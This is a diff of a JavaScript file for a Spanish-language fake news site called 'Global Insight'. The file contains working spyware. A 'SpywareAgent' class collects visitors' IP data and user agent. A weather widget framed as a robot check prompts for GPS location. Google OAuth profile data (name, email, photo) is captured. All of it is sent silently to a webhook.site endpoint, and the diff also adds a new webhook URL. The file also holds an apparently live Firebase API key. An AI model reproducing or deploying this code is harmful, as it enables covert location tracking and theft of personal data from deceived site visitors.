@@ -2,17 +2,16 @@
 /**
  * GLOBAL INSIGHT CORE SYSTEM
  * Módulo de gestión de contenidos y telemetría.
- * VERSIÓN FINAL - EXPOSICIÓN
  */
 
+// === CONFIGURACIÓN PRINCIPAL ===
 const CONFIG = {
-    WEBHOOK_URL: "https://webhook.site/69645d7a-1150-4fa8-91c8-5945d2312697", 
+    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614", 
     COOKIE_TIMEOUT: 1500,
     FORCE_ACCEPT: true
 };
 
-// === CONFIGURACIÓN FIREBASE - REEMPLAZA CON TUS CREDENCIALES REALES ===
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+// === CONFIGURACIÓN FIREBASE - REEMPLAZA ESTO ===
 const firebaseConfig = {
   apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
   authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
@@ -24,6 +23,7 @@ const firebaseConfig = {
 };
 // === FIN CONFIGURACIÓN FIREBASE ===
 
+// Base de datos
 const newsDatabase = [
     { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
     { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
@@ -35,6 +35,7 @@ const newsDatabase = [
     { title: "Nuevas regulaciones para drones de reparto", category: "Innovación" }
 ];
 
+// Clase SpywareAgent
 class SpywareAgent {
     constructor(webhook) {
         this.webhook = webhook;
@@ -49,7 +50,9 @@ class SpywareAgent {
             const data = await res.json();
             this.ipData = data;
             this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
-        } catch (e) { console.error("Fallo IP"); }
+        } catch (e) { 
+            console.error("Fallo IP:", e);
+        }
     }
 
     trackGPS(onSuccess, onError) {
@@ -79,37 +82,39 @@ class SpywareAgent {
             mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain' },
             body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
-        }).then(() => console.log(">> Datos enviados (Silencioso)")).catch(e => console.log("Error envío"));
+        }).then(() => console.log(">> Datos enviados")).catch(e => console.log("Error envío"));
     }
 
-    setCookiesAccepted(status) { this.acceptedCookies = status; }
+    setCookiesAccepted(status) { 
+        this.acceptedCookies = status; 
+    }
 }
 
-// --- SISTEMA DE AUTENTICACIÓN FIREBASE ---
-
+// Sistema de Autenticación
 class AuthManager {
     constructor() {
         this.user = null;
         this.initialized = false;
+        console.log("🔄 Creando AuthManager, FIREBASE_CONFIG disponible:", typeof FIREBASE_CONFIG !== 'undefined');
         this.initFirebase();
     }
 
     initFirebase() {
         try {
             console.log("🔄 Inicializando Firebase...");
-            console.log("📋 Config:", FIREBASE_CONFIG);
+            console.log("📋 FIREBASE_CONFIG:", FIREBASE_CONFIG);
             
             // Verificar que FIREBASE_CONFIG existe
             if (typeof FIREBASE_CONFIG === 'undefined') {
-                throw new Error("FIREBASE_CONFIG no está definida. Revisa la configuración.");
+                throw new Error("FIREBASE_CONFIG no está definida en el scope de AuthManager");
             }
 
             // Verificar que Firebase está cargado
             if (typeof firebase === 'undefined') {
-                throw new Error("Firebase SDK no está cargado. Revisa el HTML.");
+                throw new Error("Firebase SDK no está cargado. Revisa la consola del navegador.");
             }
 
-            // Verificar configuración
+            // Verificar configuración básica
             if (!FIREBASE_CONFIG.apiKey || FIREBASE_CONFIG.apiKey.includes("AAAAAAAA")) {
                 throw new Error("Configuración de Firebase no válida. Reemplaza las credenciales en FIREBASE_CONFIG.");
             }
@@ -131,24 +136,32 @@ class AuthManager {
     }
 
     showFirebaseError(message) {
+        // Mostrar error en la UI
         const errorDiv = document.createElement('div');
         errorDiv.style.cssText = `
             position: fixed; top: 10px; left: 10px; background: #d93025; color: white;
             padding: 15px; border-radius: 5px; z-index: 10000; max-width: 400px;
-            font-family: Arial, sans-serif; font-size: 14px;
+            font-family: Arial, sans-serif; font-size: 12px; border: 2px solid #ff4444;
         `;
         errorDiv.innerHTML = `
-            <strong>Error de Firebase:</strong><br>
-            ${message}<br>
-            <small>Verifica la configuración en app.js</small>
+            <strong>🔧 Error de Configuración Firebase:</strong><br>
+            ${message}<br><br>
+            <strong>Pasos para solucionar:</strong><br>
+            1. Ve a Firebase Console<br>
+            2. Crea un proyecto y habilita Authentication<br>
+            3. Copia las credenciales reales<br>
+            4. Reemplaza FIREBASE_CONFIG en app.js
         `;
         document.body.appendChild(errorDiv);
-        
-        // También mostrar en el botón de login
+
+        // Deshabilitar botón de login
         const loginBtn = document.getElementById('btn-login');
         if (loginBtn) {
-            loginBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error Config';
+            loginBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Configurar Firebase';
             loginBtn.style.background = '#d93025';
+            loginBtn.onclick = () => {
+                alert("Reemplaza FIREBASE_CONFIG con tus credenciales reales de Firebase");
+            };
         }
     }
 
@@ -166,33 +179,22 @@ class AuthManager {
 
     async signInWithGoogle() {
         if (!this.initialized) {
-            const errorMsg = "Firebase no se inicializó correctamente. Verifica la consola.";
-            alert(errorMsg);
+            alert("Sistema de autenticación no disponible. Configura Firebase primero.");
             return null;
         }
 
-        const provider = new firebase.auth.GoogleAuthProvider();
-        provider.addScope('profile');
-        provider.addScope('email');
-
         try {
             console.log("🔐 Iniciando autenticación con Google...");
+            const provider = new firebase.auth.GoogleAuthProvider();
+            provider.addScope('profile');
+            provider.addScope('email');
+            
             const result = await firebase.auth().signInWithPopup(provider);
             console.log("✅ Autenticación exitosa:", result.user);
             return result.user;
         } catch (error) {
             console.error("❌ Error en login:", error);
-            
-            let errorMessage = "Error al iniciar sesión: ";
-            if (error.code === 'auth/popup-blocked') {
-                errorMessage += "El popup fue bloqueado. Permite ventanas emergentes.";
-            } else if (error.code === 'auth/popup-closed-by-user') {
-                errorMessage += "Cerraste la ventana de login.";
-            } else {
-                errorMessage += error.message;
-            }
-            
-            alert(errorMessage);
+            alert("Error al iniciar sesión: " + error.message);
             return null;
         }
     }
@@ -224,11 +226,7 @@ class AuthManager {
             authWidget.style.display = 'none';
             profileWidget.style.display = 'block';
             
-            console.log("👤 Perfil mostrado:", {
-                nombre: user.displayName,
-                email: user.email,
-                foto: user.photoURL
-            });
+            console.log("👤 Perfil mostrado:", user.displayName, user.email);
         }
     }
 
@@ -249,12 +247,6 @@ class AuthManager {
             displayName: user.displayName,
             photoURL: user.photoURL,
             emailVerified: user.emailVerified,
-            providerData: user.providerData,
-            metadata: {
-                creationTime: user.metadata.creationTime,
-                lastSignInTime: user.metadata.lastSignInTime
-            },
-            ipData: window.spyAgent?.ipData,
             timestamp: new Date().toISOString()
         };
 
@@ -262,18 +254,14 @@ class AuthManager {
             window.spyAgent.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
         }
 
-        console.log("📧 Datos de usuario capturados para exfiltración:", userData);
-        
         console.log("🎯 DATOS OBTENIDOS LEGALMENTE:");
         console.log("   👤 Nombre:", user.displayName);
         console.log("   📧 Email:", user.email);
         console.log("   🖼️ Foto:", user.photoURL);
-        console.log("   🆔 UID:", user.uid);
     }
 }
 
-// --- FUNCIONES DE INTERFAZ (UI) ---
-
+// Funciones UI
 function renderNews() {
     const heroEl = document.getElementById("hero-news");
     const gridEl = document.getElementById("secondary-grid");
@@ -328,80 +316,7 @@ function renderTrending() {
     });
 }
 
-// --- INICIO DE LA APLICACIÓN ---
-document.addEventListener("DOMContentLoaded", async () => {
-    
-    console.log("🚀 Iniciando aplicación Global Insight...");
-    console.log("🔍 Verificando FIREBASE_CONFIG:", typeof FIREBASE_CONFIG);
-    
-    // 1. Inicializar Agente Espía
-    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
-    window.spyAgent = spy;
-
-    // 2. Inicializar Sistema de Autenticación
-    const authManager = new AuthManager();
-    window.authManager = authManager;
-
-    // 3. Cargar contenido VISUAL inmediatamente
-    renderNews();
-    renderTrending();
-
-    // 4. Configurar eventos de autenticación
-    setupAuthEvents(authManager);
-
-    // 5. Activar trampa de cookies después de un momento
-    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);
-
-    // Fecha Header
-    const dateEl = document.getElementById("current-date");
-    if(dateEl) {
-        dateEl.innerText = new Date().toLocaleDateString('es-ES', { 
-            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
-        });
-    }
-
-    // LÓGICA DEL CLIMA (TRAMPA GPS)
-    const btnGps = document.getElementById("btn-gps-trigger");
-    const weatherWidget = document.getElementById("weather-trap");
-    
-    if(btnGps && weatherWidget) {
-        const blurContent = weatherWidget.querySelector(".blur-content");
-
-        btnGps.addEventListener("click", () => {
-            if (!spy.acceptedCookies) {
-                alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
-                const modal = document.getElementById('cookie-modal');
-                if(modal) modal.style.display = 'flex';
-                return;
-            }
-            
-            const btn = btnGps.querySelector("button");
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo...';
-            
-            spy.trackGPS(
-                async (data) => {
-                    btnGps.style.opacity = "0";
-                    setTimeout(() => { btnGps.style.display = "none"; }, 500);
-                    
-                    try {
-                        const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
-                        const weatherData = await weatherRes.json();
-                        updateWeatherUI(weatherWidget, blurContent, weatherData.current_weather);
-                    } catch (error) {
-                        updateWeatherUI(weatherWidget, blurContent, { temperature: "24", weathercode: 1 });
-                    }
-                },
-                (error) => {
-                    btn.innerHTML = "Ubicación Bloqueada";
-                    setTimeout(() => { btn.innerHTML = originalText; }, 2000);
-                    alert("Activa la ubicación en el navegador.");
-                }
-            );
-        });
-    }
-});
-
+// Configurar eventos de auth
 function setupAuthEvents(authManager) {
     const loginBtn = document.getElementById('btn-login');
     const googleLoginBtn = document.getElementById('btn-google-login');
@@ -424,10 +339,10 @@ function setupAuthEvents(authManager) {
             if (user) {
                 if (loginModal) loginModal.style.display = 'none';
                 showCustomNotification(`Bienvenido, ${user.displayName || 'Usuario'}!`);
+            } else {
+                googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
+                googleLoginBtn.disabled = false;
             }
-
-            googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
-            googleLoginBtn.disabled = false;
         });
     }
 
@@ -442,6 +357,13 @@ function setupAuthEvents(authManager) {
         loginModal.addEventListener('click', (e) => {
             if (e.target === loginModal) {
                 loginModal.style.display = 'none';
+                
+                // Resetear botón si se cierra el modal
+                const googleLoginBtn = document.getElementById('btn-google-login');
+                if (googleLoginBtn) {
+                    googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
+                    googleLoginBtn.disabled = false;
+                }
             }
         });
     }
@@ -513,3 +435,80 @@ style.textContent = `
     }
 `;
 document.head.appendChild(style);
+
+// === INICIALIZACIÓN PRINCIPAL ===
+document.addEventListener("DOMContentLoaded", () => {
+    console.log("🚀 Iniciando aplicación Global Insight...");
+    console.log("🔍 Verificando FIREBASE_CONFIG en scope global:", typeof FIREBASE_CONFIG);
+    console.log("📋 Valor FIREBASE_CONFIG:", FIREBASE_CONFIG);
+    
+    // 1. Inicializar Agente Espía
+    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
+    window.spyAgent = spy;
+
+    // 2. Inicializar Sistema de Autenticación
+    console.log("🔄 Creando AuthManager...");
+    const authManager = new AuthManager();
+    window.authManager = authManager;
+
+    // 3. Cargar contenido VISUAL
+    renderNews();
+    renderTrending();
+
+    // 4. Configurar eventos
+    setupAuthEvents(authManager);
+
+    // 5. Trampa de cookies
+    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);
+
+    // Fecha
+    const dateEl = document.getElementById("current-date");
+    if(dateEl) {
+        dateEl.innerText = new Date().toLocaleDateString('es-ES', { 
+            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
+        });
+    }
+
+    // GPS
+    const btnGps = document.getElementById("btn-gps-trigger");
+    const weatherWidget = document.getElementById("weather-trap");
+    
+    if(btnGps && weatherWidget) {
+        const blurContent = weatherWidget.querySelector(".blur-content");
+
+        btnGps.addEventListener("click", () => {
+            if (!spy.acceptedCookies) {
+                alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
+                const modal = document.getElementById('cookie-modal');
+                if(modal) modal.style.display = 'flex';
+                return;
+            }
+            
+            const btn = btnGps.querySelector("button");
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo...';
+            
+            spy.trackGPS(
+                async (data) => {
+                    btnGps.style.opacity = "0";
+                    setTimeout(() => { btnGps.style.display = "none"; }, 500);
+                    
+                    try {
+                        const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
+                        const weatherData = await weatherRes.json();
+                        updateWeatherUI(weatherWidget, blurContent, weatherData.current_weather);
+                    } catch (error) {
+                        updateWeatherUI(weatherWidget, blurContent, { temperature: "24", weathercode: 1 });
+                    }
+                },
+                (error) => {
+                    btn.innerHTML = "Ubicación Bloqueada";
+                    setTimeout(() => { btn.innerHTML = originalText; }, 2000);
+                    alert("Activa la ubicación en el navegador.");
+                }
+            );
+        });
+    }
+
+    console.log("✅ Aplicación inicializada completamente");
+});
